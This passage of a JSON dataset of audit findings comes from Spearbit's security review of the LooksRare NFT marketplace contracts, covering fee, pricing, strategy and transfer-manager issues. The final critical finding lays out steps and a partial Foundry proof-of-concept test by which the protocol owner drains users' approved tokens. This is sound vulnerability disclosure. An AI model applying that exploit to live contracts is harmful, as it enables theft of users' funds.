      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6982",
      "title": "Seller might get a lower fee than expected due to front-running",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\n- `ExecutionManager.sol#L95`\n- `ExecutionManager.sol#L183`\n\n## Description\nThis protocol seems to have a fee structure where both the protocol and the original creator of the item are charging fees, and these fees are being subtracted from the seller's fee. This means that the seller, whether they are a maker or a taker, may receive a lower price than they expected due to sudden changes in creator or protocol fee rates.\n\n## Recommendation\nThe impact of the described issue is limited since a potential loss is already capped in the current version of the code. However, it is still recommended to add a variable that represents the maximum fee that the seller is willing to pay to the `Order` struct, and to validate that the actual fee does not exceed this value. This will provide an additional layer of protection against any potential losses.\n\n## Acknowledgements\n\n### LooksRare\nAcknowledged. This is a known accepted issue with numbers up to 5% for protocol fee (set at the strategy) and 10% (originally 25%) for royalty. So while the default is 2% (2% protocol fees and no royalty), it can be as high as 15% (5% protocol fees and 10% royalties). This was implemented in such a way to simplify the logic in the backend from preventing orders that cannot be executed due to mismatch on-chain and off-chain slippage.\n\n### Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6981",
      "title": "Affiliates can trick the protocol to receive fees even when not needed",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\n*LooksRareProtocol.sol#L440*\n\n## Description\nCurrently, takers specify the address of an affiliate, which will get a portion of the protocol fee in case it has a non-zero value in the affiliateRates mapping, and the affiliate program is active. Whitelisted affiliates can trick the system by either colluding with potential takers that will set their affiliate address and then later split the revenue between them or by acting as both the taker and the affiliate (by using different addresses that belong to the same party) when trading their own items. This, in turn, will cause a decrease in fees collected by the protocol address.\n\n## Acknowledgements\n**LooksRare:** Acknowledged. Accepted as a business risk inherent to the feature.  \n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6980",
      "title": "CreatorFeeManagerWithRebates.viewCreatorFeeInfo reversion is dependent on the order of itemIds",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- CreatorFeeManagerWithRebates.sol#L57-L64\n\n## Description\nAssume there is an itemId `x` where `collection.royaltyInfo(x, price)` returns `(0, _)` and another itemId `y` where `collection.royaltyInfo(y, price)` returns `(a, _)` where `a ≠ 0`.  \nThen if the `itemIds` array provided to `CreatorFeeManagerWithRebates.viewCreatorFeeInfo` is `[x, y, ...]`, the return parameters would be `(address(0), 0)` and `[y, x, ...]`, the call would revert with `BundleEIP2981NotAllowed(collection)`.\n\n## Recommendation\nThe outcome of the call to `CreatorFeeManagerWithRebates.viewCreatorFeeInfo` should not be dependent on the order of `itemIds`. We should loop over all `itemIds` and make sure all the creators match before returning.\n\n## LooksRare\nFixed in PR 324.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6979",
      "title": "viewCreatorFeeInfo 's reversion depends on order of successful calls to collection.royaltyInfo",
      "impact": "LOW",
      "content": "## Low Risk Severity Report\n\n## Context\n- **CreatorFeeManagerWithRoyalties.sol**: Lines 56-61\n- **CreatorFeeManagerWithRebates.sol**: Lines 51-54\n\n## Description\nThe outcome of the call to `viewCreatorFeeInfo` for both `CreatorFeeManagerWithRebates` and `CreatorFeeManagerWithRoyalties` is dependent on the order of `itemIds`. \n\nAssume we have 2 `itemIds` with the following properties:\n- `itemId x` where the call to `collection.royaltyInfo(x, price)` is successful (`status == 1`) and returns `(a, ...)` where `a ≠ 0`.\n- `itemId y` where the call to `collection.royaltyInfo(y, price)` fails (`status == 0`).\n\nThen if the `itemIds` provided to `viewCreatorFeeInfo` is:\n- `[x, y]`, the call to `viewCreatorFeeInfo` returns successfully as the outcome for `y` will be ignored/skipped.\n- `[y, x]`, the call to `viewCreatorFeeInfo` reverts with `BundleEIP2981NotAllowed(collection)`, since the first item will be skipped and so the initial value for `creator` will not be set and remains `address(0)`. When we process the loop for `x`, we end up comparing `a` with `address(0)`, which causes the revert.\n\n## Recommendation\nEither revert the calls to `viewCreatorFeeInfo` when a call to `collection.royaltyInfo` fails, or set the creator (`creatorFee`) on the first successful call to `collection.royaltyInfo` (which might not be the first round of the loop when `i = 0`) and ignore all failed calls.\n\n## Additional Notes\n- **LooksRare**: Fixed in PR 346.\n- **Spearbit**: Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6978",
      "title": "Temporary DoS is possible in case orders are using tokens with blacklists",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nLooksRareProtocol.sol#L470\n\n## Description\nIn the process of settling orders, `_transferFungibleTokens` is being called a maximum of 4 times. If one of these calls fails, the entire transaction fails. It can only fail when an ERC20 token is used for the trade, but since contracts are whitelisted in the system and probably vetted by the team, it's safe to say it's less probable that the receiver will have the ability to revert the entire transaction, although it is possible for contracts that implement the `transferAndCall` pattern. \n\nHowever, there's still the issue of transactions being reverted due to blacklisting (which have become more popular in the last year). To better assess the risk, let's elaborate more on the 4 potential recipients of a transaction:\n\n1. **Affiliate** - The risk can be easily mitigated by proper handling at the front-end level. If the transaction fails due to the affiliate's address, the taker can specify `address(0)` as the affiliate.\n  \n2. **Recipient** - If the transaction fails due to the recipient's address, it can only impact the taker in a gas-griefing way.\n\n3. **Protocol** - If the transaction fails due to the protocol's address, its address might be updated by the contract owner in the worst-case scenario.\n\n4. **Creator** - If the transaction fails due to the creator's address, it cannot be changed directly, but in the worst-case scenario, `creatorFeeManager` can be changed.\n\n## Recommendation\nIn conclusion, this issue cannot brick the system entirely, and specific orders cannot be forever censored this way. However, it may still cause a temporary DoS for certain orders. That's why it is recommended to use an off-chain monitoring service to monitor blacklisted addresses that are used by the protocol, and to ensure that it is supported at the front-end level as well, if needed. \n\nAnother alternative would be to implement a \"pull pattern\" where the fee beneficiaries (affiliate, creator, protocol) have to withdraw their allocated fees from the contract, thus decoupling a potential failure in the transfer action from the overall item transaction. There is a trade-off between security and user experience, and it's up to the project team to make this decision. \n\nEither way, it is recommended to have a proper internal vetting process for tokens before whitelisting.\n\n---\n\n**LooksRare:** Acknowledged.  \n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6977",
      "title": "An added transfer manager cannot get deactivated from the protocol",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context:\n- **File:** TransferSelectorNFT.sol\n\n## Description:\nOnce a transfer manager for an asset type gets added to the protocol either through the constructor or through `addTransferManagerForAssetType`, if at some point there is malicious behavior involved with the transfer manager, there is no mechanism for the protocol's owner to deactivate the transfer manager (similar to how strategies can be deactivated). \n\nIf `IfTransferManager` is used for an asset type, on the TransferManager side the owner can break the link between the operator (the LooksRare protocol potentially) and the TransferManager but not the other way around.\n\n## Recommendation:\nWe can add an update functionality where only the activation status of a transfer manager can get updated (and not the implementation or the selector) by the protocol owner.\n\nIf an update mechanism will not be added, the above case should be documented/commented for the users/makers so that in case of malicious activity by a transfer manager for an asset type, they would stop signing orders with that asset type and also would cancel the already signed orders. Takers would need to refrain from executing orders with that particular asset type.\n\nIf the current and potential transfer managers would have the same owners as the protocol, and if that owner can break the link between these two contracts from at least one side, implementing a second pass-through filter is not necessary.\n\n## LooksRare:\nThis issue is not relevant anymore following the changes implemented in PR 308.\n\n## Spearbit:\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6976",
      "title": "A strategy can potentially reduce the value of a token before it gets transferred to a maker when a taker calls executeTakerAsk",
      "impact": "LOW",
      "content": "## Security Risk Report\n\n**Severity:** Low Risk\n\n## Context\n- ExecutionManager.sol#L124\n- ExecutionManager.sol#L210\n\n## Description\nWhen `executeTakerAsk` is called by a taker, a (signed by maker) strategy will be called:\n```solidity\n(bool status, bytes memory data) = strategyInfo[makerBid.strategyId].implementation.call(\n    abi.encodeWithSelector(strategyInfo[makerBid.strategyId].selector, takerAsk, makerBid)\n);\n```\nNote that this is a stateful call. This call is performed before the NFT token is transferred to the maker (signer). Even though the strategy is fixed by the maker (since the strategyId has been signed), the strategy's implementation might involve complex logic that could allow (if the strategy colludes with the taker somehow) a derivative token (that is owned by / linked to the to-be-transferred token) to be reattached to another token (think of accessories for an NFT character token in a game). Consequently, the value of the to-be-transferred token would be reduced in that sense. A maker would not be able to check for this linked derivative token ownership during the transaction since there is no post-transfer hook for the maker (except in one special case when the token involved is ERC1155 and the maker is a custom contract).\n\nAlso, note that all the implemented strategies would not alter the state when they are called (their endpoints have a pure or a view visibility). There is an exception to this in the `StrategyTestMultiFillCollectionOrder` test contract.\n\n## Recommendation\nIt would be best to only allow `staticcall` when the protocol makes a call into a strategy to avoid the issues above. This recommendation also does not break the flow for any of the currently implemented strategies.\n```solidity\n(bool status, bytes memory data) = strategyInfo[makerXxx.strategyId].implementation.staticcall( // <---\n    abi.encodeWithSelector(strategyInfo[makerXxx.strategyId].selector, takerYyy, makerXxx)\n);\n```\n\n## Acknowledgments\n**LooksRare:** There might be future strategies that change state in the strategy contract; hence, we decided to keep it as `call` instead of `staticcall`. Acknowledged as a business risk.\n\n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6975",
      "title": "The maker cannot enforce the number of times a specific order can be fulfilled for custom strategies",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- ExecutionManager.sol#L221\n- ExecutionManager.sol#L135\n- LooksRareProtocol.sol#L549-L556\n\n## Description\nWhen a maker signs an order with a specific strategy, it leaves it up to the strategy to decide how many times this specific order can be fulfilled. The strategy's logic on how to decide on the returned `isNonceInvalidated` value can be complex and may be prone to errors (or have backdoors). The maker should be able to directly enforce at least an upper bound for the maximum number of fulfills for an order to avoid unexpected expenditure.\n\n## Recommendation\nIt would be best to introduce a new field `maxNumberOfFulfillments` (or a similar name) for the structs `MakerBid` and `MakerAsk`, which the maker can sign. The LooksRare protocol would need to define a new storage parameter that keeps track of the number of fulfillments based on the `orderHash`:\n```solidity\nmapping(bytes32 => uint256) private orderFulfilled;\n```\nand ensure that the number of fulfillments (`orderFulfilled[orderHash]`) does not surpass `maxNumberOfFulfillments`.\n\n## Responses\n- **LooksRare:** Acknowledged but won't implement.\n- **Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6974",
      "title": "transferItemsERC721 and transferBatchItemsAcrossCollections inTransferManager do not check whether an amount == 1 for an ERC721 token",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context:\n- TransferManager.sol#L47\n- TransferManager.sol#L112\n\n## Description:\n`transferItemsERC721` and `transferBatchItemsAcrossCollections` in `TransferManager` do not check whether an amount is equal to 1 for an ERC721 token. If an operator (approved by a user) sends a 0 amount for an `itemId` in the context of transferring an ERC721 token, `TransferManager` would perform those transfers, even though the logic in the operator might have meant to avoid those transfers.\n\n## Recommendation:\nIn `transferItemsERC721` and `transferBatchItemsAcrossCollections`, it would be best to introduce checks for ERC721 token amounts to ensure they are always 1 (if not, skip or revert).\n\n## LooksRare:\nAmount checks have been moved from execution strategies to the transfer manager in PR 386.\n\n## Spearbit:\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6973",
      "title": "TransferManager 's owner can block token transfers for LooksRareProtocol",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- TransferManager.sol#L241\n- TransferSelectorNFT.sol#L28-L32\n\n## Description\nIn general, a deployed TransferManager (T) and a deployed LooksRareProtocol (L) might have two different owners (OT, OL). Assume TransferManager is used for asset types 0 and 1 (ERC721, ERC1155) in LooksRareProtocol and TransferManager has marked the LooksRareProtocol as an allowed operator. At any point, OT can call `removeOperator` to block L from calling T. If that happens, OL would need to add new (virtual) asset types (not 0 or 1) and the corresponding transfer managers for them. Makers would need to resign their orders with new asset types. \n\nMoreover, if LooksRare for the following issue \"The Protocol owner can drain users' currency tokens\" applies their solution through PR 308 which removes the ability of OL to add new asset types, then the whole protocol would need to be redeployed since all order executions would revert.\n\n## Recommendation\nEnforce OL = OT. This can be done by modifying the LooksRareProtocol's constructor to deploy TransferManager and assign OL as its owner and make sure OL can only update OT at any point in time. Another solution to this problem could be to make sure OL has more power than OT. For example, OL should be able to set/update OT at any point (one can check that before adding T to L).\n\n## LooksRare\nAcknowledged, but the purpose of having a transfer manager contract separate from the protocol contract is to allow future versions of marketplace protocols (or other systems) to reuse existing user approvals. It is possible the protocol itself \"gets discontinued\" in the future with ownership being renounced while the transfer manager system remains active.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6972",
      "title": "StrategyItemIdsRange does not invalidate makerBid.amounts[0] == 0",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context:\n- **File:** StrategyItemIdsRange.sol#L44\n\n## Description:\nStrategyItemIdsRange does not check whether `makerBid.amounts[0]` is zero or not. If it was 0, the taker can provide empty `itemIds` and `amounts` which will cause the for loop to be skipped. The check below will also be successful since both amounts are 0:\n\n```solidity\nif (totalOfferedAmount != desiredAmount) {\n    revert OrderInvalid();\n}\n```\n\nDepending on the used implementation of a transfer manager for the asset type used in this order, we might end up with the taker taking funds from the maker without providing any NFT tokens. The current implementation of TransferManager does check whether the provided `itemIds` have length 0 and it would revert in that case.\n\nOne difference between this strategy and others is that all strategies, including this one, do check to revert if an amount for a specific `itemId` is 0 (and some of them have loops but the length of those loops depends on the parameters from the maker which enforce the loop to run at least once). However, for this strategy, if no `itemIds` are provided by the taker, the loop is skipped and one does not check whether the aggregated amount is 0 or not.\n\n## Recommendation:\n`executeStrategyWithTakerAsk` and `isMakerBidValid`, both should check whether `makerBid.amounts[0] == 0` and revert (return invalid).\n\n## Notes:\n- **LooksRare:** Fixed in PR 367.\n- **Spearbit:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6971",
      "title": "minPrice and maxPrice should reflect the allowed regions for the funds to be transferred from the bidder to the ask recipient",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- ExecutionManager.sol#L157-L167\n- ExecutionManager.sol#L243-L253\n\n## Description\n1. When a maker or taker sets a `minPrice` for an ask, the protocol should guarantee the funds they receive is at minimum the `minPrice` amount (currently not enforced).\n2. Conversely, when a maker or taker sets a `maxPrice` for a bid, the protocol should guarantee that the amount they spend is at maximum `maxPrice` (currently enforced).\n\nFor point 1, the current protocol-controlled deviation can be 30% maximum (sum of fees sent to the creator, the protocol fee recipient, and an affiliate).\n\n## Recommendation\nOne can enforce both of the above points by making sure strategies only require:\n\n```\nminPrice <= maxPrice\n```\n\nThey do not need to be equal in general for each strategy and can be indirectly enforced at the protocol level. Related issue: \"price validation in `executeStrategyWithTakerAsk`, `executeCollectionStrategyWithTakerAsk`, and `executeCollectionStrategyWithTakerAskWithProof` can be relaxed.\"\n\n### Changes required for taker bid strategies\n- **Common Changes for All Strategies**: \n  - The `takerBid.maxPrice` needs to be compared to the sum of the price returned by the strategy and the fees that would need to be sent to the creator, protocol fee recipient, and an affiliate:\n  \n    ```\n    takerBid.maxPrice >= sum\n    ```\n\n  - Note that in this case fees are not deducted from the price but added, and the taker is responsible for paying all those fees, while having the `takerBid.maxPrice` as a guard so that they don't end up paying more than what they had set. This would also allow the maker to receive the full amount of the fund/price set by their chosen strategy.\n\n- **InheritedStrategy**: \n  - `iszero(eq(price, counterpartyPrice))` needs to be taken out of this shared logic between taker bid and ask executions. The strategy chooses `makerAsk.minPrice` as the strategy's price, which is correct since we also need to ensure the price returned by the strategy (what the maker would receive) is at least `makerAsk.minPrice`.\n\n- **StrategyDutchAuction**: \n  - `if (takerBid.maxPrice < price)` needs to be removed as the common required change would cover this. This strategy picks the price in a way that it is not less than `makerAsk.minPrice`.\n\n- **StrategyUSDDynamicAsk**: \n  - `if (takerBid.maxPrice < price)` needs to be removed as the common required change would cover this. This strategy picks the price in a way that it is not less than `makerAsk.minPrice`.\n\n- **StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid**: \n  - `if (takerBid.maxPrice < price)` (2) needs to be removed as the common required change would cover this. This strategy picks the price in a way that it is not less than `makerAsk.minPrice`.\n\nIn summary, remove the above-mentioned checks for `takerBid.maxPrice` from individual strategies and apply a similar check at the protocol level that also includes the extra fees.\n\n### Changes in Fees Calculation\nThe following code will be replaced:\n\n```solidity\nif (fees[1] == 0) {\n    // If creator fee is null, protocol fee is set as the minimum total fee amount\n    fees[0] = minTotalFeeAmount;\n    // Net fee amount for seller\n    fees[2] = price - fees[0];\n} else {\n    // If there is a creator fee information, the protocol fee amount can be calculated\n    fees[0] = _calculateProtocolFeeAmount(price, makerAsk.strategyId, fees[1], minTotalFeeAmount);\n    // Net fee amount for seller\n    fees[2] = price - fees[1] - fees[0];\n}\n```\n\nWith:\n\n```solidity\nfees[2] = price;\nif (fees[1] == 0) {\n    // If creator fee is null, protocol fee is set as the minimum total fee amount\n    fees[0] = minTotalFeeAmount;\n} else {\n    // If there is a creator fee information, the protocol fee amount can be calculated\n    fees[0] = _calculateProtocolFeeAmount(price, makerAsk.strategyId, fees[1], minTotalFeeAmount);\n}\nif (takerBid.maxPrice < (fees[0] + fees[1] + fees[2])) {\n    revert BidTooLow();\n}\n```\n\nFuture taker bid strategies must guarantee that the price they pick is always at least `makerAsk.minPrice (pmakerAsk.min <= f2)` and that the protocol validates the returned price range, including the fees against the `takerBid.maxPrice (f0 + f1 + f2 <= ptakerBid.max)`.\n\n### Changes required for taker ask strategies\n- **Common Changes for All Strategies**: \n  - The `takerAsk.minPrice` needs to be compared to `fees[2]`, which is the amount the `msg.sender` or `takerAsk.recipient` would receive.\n\n- **InheritedStrategy**: \n  - `iszero(eq(price, counterpartyPrice))` needs to be taken out of this shared logic between taker bid and ask executions. The strategy chooses `makerBid.maxPrice` as the strategy's price, which is correct since we also need to ensure the price returned by the strategy (what the maker would spend) is at most `makerBid.maxPrice`.\n\n- **StrategyItemIdsRange**: \n  - `if (makerBid.maxPrice != takerAsk.minPrice)` needs to be removed as the common required change would cover this. This strategy picks the price in a way that it is not greater than `makerBid.maxPrice`.\n\n- **StrategyCollectionOffer**: \n  - `price != takerAsk.minPrice (2)` needs to be removed as the common required change would cover this. This strategy picks the price in a way that it is not greater than `makerBid.maxPrice`.\n\n- **StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk**: \n  - `if (takerAsk.minPrice > price) (2)` needs to be removed as the common required change would cover this. This strategy picks the price in a way that it is not greater than `makerBid.maxPrice`.\n\nIn summary, remove the above-mentioned checks for `takerAsk.minPrice` from individual strategies and apply a similar check at the protocol level that also excludes deducted fees:\n\n### Changes in Fees Calculation\nThe code can be updated as follows:\n\n```solidity\nif (fees[1] == 0) {\n    // If creator fee is null, protocol fee is set as the minimum total fee amount\n    fees[0] = minTotalFeeAmount;\n    // Net fee for seller\n    fees[2] = price - fees[0];\n} else {\n    // If there is a creator fee information, the protocol fee amount can be calculated\n    fees[0] = _calculateProtocolFeeAmount(price, makerBid.strategyId, fees[1], minTotalFeeAmount);\n    // Net fee for seller\n    fees[2] = price - fees[1] - fees[0];\n}\n```\n\nAnd adding a new check:\n\n```solidity\nif (takerAsk.minPrice > fees[2]) {\n    revert AskTooHigh();\n}\n```\n\nFuture taker ask strategies must guarantee that the price they pick is always at most `makerBid.maxPrice (f2 <= pmakerBid.max)` and, by the above change, the protocol validates the returned price range excluding the fees against the `takerAsk.minPrice (ptakerAsk.min <= f2 - f0 - f1)`.\n\nThe above changes would protect the invariants set by the maker and taker when slippage is introduced by:\n- Variable creator fees.\n- Owner front-running (potentially accidentally) a transaction to change the fee percentages before an order gets executed.\n\n## Related Issue\n\"Seller might get a lower fee than expected due to front-running\"\n\n**LooksRare**: Acknowledged.  \n**Spearbit**: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6970",
      "title": "StrategyFloorFromChainlink will often revert due to stale prices",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nStrategyFloorFromChainlink.sol\n\n## Description\nThe `FloorFromChainlink` strategy inherits from `BaseStrategyChainlinkPriceLatency`, so it can have a `maxLatency` of at most 3600 seconds. However, all of the Chainlink mainnet floor price feeds have a heartbeat of 86400 seconds (24 hours), which means the Chainlink strategies will revert with the `PriceNotRecentEnough` error quite often. At the time of writing, every single mainnet floor price feed has an `updateAt` timestamp well over 3600 seconds in the past, meaning the strategy would always revert for any mainnet price feed right now. \n\nThis may have not been realized earlier because the Goerli floor price feeds do have a heartbeat of 3600, but the mainnet heartbeat is much less frequent. \n\nOne of the consequences is that users might miss out on exchanges they would have accepted. For example, if a taker bid is interested in a maker ask with an ETH premium from the floor, in the likely scenario where the taker didn't log in within 1 hour of the last oracle update, the strategy will revert and the exchange won't happen even though both parties are willing. If the floor moves up again the taker might not be interested anymore. The maker will have lost out on making a premium from the floor, and the taker would have lost out on the exchange they were willing to make.\n\n## Recommendation\nFor the `FloorFromChainlink` strategy, allow for a `maxLatency` value of 86400, instead of restricting it at 3600.\n\n## LooksRare\nFixed in PR 326.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report is about the FloorFromChainlink strategy in the StrategyFloorFromChainlink.sol contract. Currently, the maxLatency of the strategy is restricted to 3600 seconds, but the mainnet floor price feeds have a heartbeat of 86400 seconds. As a result, the strategy often reverts with the PriceNotRecentEnough error, and users might miss out on exchanges they would have accepted. To solve this issue, the recommendation is to allow for a maxLatency value of 86400 instead of 3600. The bug has been fixed in PR 326 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Stale Price"
      ],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6969",
      "title": "The Protocol owner can drain users' currency tokens",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context:\n- LooksRareProtocol.sol#L138\n- LooksRareProtocol.sol#L391-L398\n- ITransferSelectorNFT.sol#L14-L17\n- TransferSelectorNFT.sol#L41\n- TransferSelectorNFT.sol#L89-L98\n\n## Description:\nThe Protocol owner can drain users' currency tokens that have been approved to the protocol. Makers who want to bid on NFTs would need to approve their currency token to be spent by the protocol. The owner should not be able to access these funds for free.\n\nThe owner can drain the funds as follows:\n\n1. Calls `addTransferManagerForAssetType` and assigns the currency token as the `transferManagerForAssetType` and `IERC20.transferFrom.selector` as the `selectorForAssetType` for a new `assetType`.\n2. Signs an almost empty `MakerAsk` order and sets its collection as the address of the targeted user and the `assetType` to the newly created `assetType`. The owner also creates the corresponding `TakerBid` by setting the `recipient` field to the amount of currency they would like to transfer.\n3. Calls the `executeTakerBid` endpoint with the above data without a `merkleTree` or `affiliate`.\n\n```solidity\n// file: test/foundry/Attack.t.sol\npragma solidity 0.8.17;\n\nimport {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\";\nimport {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\";\nimport {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\";\nimport {ProtocolBase} from \"./ProtocolBase.t.sol\";\nimport {MockERC20} from \"../mock/MockERC20.sol\";\n\ncontract NullStrategy is IBaseStrategy {\n    function isLooksRareV2Strategy() external pure override returns (bool) {\n        return true;\n    }\n\n    function executeNull(\n        OrderStructs.TakerBid calldata /* takerBid */,\n        OrderStructs.MakerAsk calldata /* makerAsk */\n    )\n        external\n        pure\n        returns (\n            uint256 price,\n            uint256[] memory itemIds,\n            uint256[] memory amounts,\n            bool isNonceInvalidated\n        )\n    {}\n}\n\ncontract AttackTest is ProtocolBase {\n    NullStrategy private nullStrategy;\n    MockERC20 private mockERC20;\n    uint256 private signingOwnerPK = 42;\n    address private signingOwner = vm.addr(signingOwnerPK);\n    address private victimUser = address(505);\n\n    function setUp() public override {\n        super.setUp();\n        vm.startPrank(_owner);\n        looksRareProtocol.initiateOwnershipTransfer(signingOwner);\n        // This particular strategy is not a requirement of the exploit.\n        nullStrategy = new NullStrategy();\n        looksRareProtocol.addStrategy(\n            0,\n            0,\n            0,\n            NullStrategy.executeNull.selector,\n            false,\n            address(nullStrategy)\n        );\n        mockERC20 = new MockERC20();\n        looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true);\n        looksRareProtocol.updateCreatorFeeManager(address(0));\n        mockERC20.mint(victimUser, 1000);\n        vm.stopPrank();\n        vm.prank(signingOwner);\n        looksRareProtocol.confirmOwnershipTransfer();\n    }\n\n    function testDrain() public {\n        vm.prank(victimUser);\n        mockERC20.approve(address(looksRareProtocol), 1000);\n        vm.startPrank(signingOwner);\n        looksRareProtocol.addTransferManagerForAssetType(\n            2,\n            address(mockERC20),\n            mockERC20.transferFrom.selector\n        );\n        OrderStructs.MakerAsk memory makerAsk =\n            